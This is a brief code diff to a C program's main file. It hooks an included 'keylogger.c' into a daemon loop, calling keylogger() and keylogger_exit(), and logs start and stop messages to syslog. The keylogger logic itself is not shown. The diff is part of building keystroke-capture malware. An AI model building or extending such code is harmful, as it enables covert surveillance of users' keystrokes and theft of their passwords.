@@ -1,4 +1,5 @@
 #include "daemonize.c"
+#include "keylogger.c"
 
 int main()
 {
@@ -6,13 +7,14 @@ int main()
     
     while (1)
     {
-        //TODO: Insert daemon code here.
         syslog (LOG_NOTICE, "Keylogger started.");
+        keylogger();
         sleep (20);
         break;
     }
    
     syslog (LOG_NOTICE, "Keylogger terminated.");
+    keylogger_exit();
     closelog();
     
     return EXIT_SUCCESS;
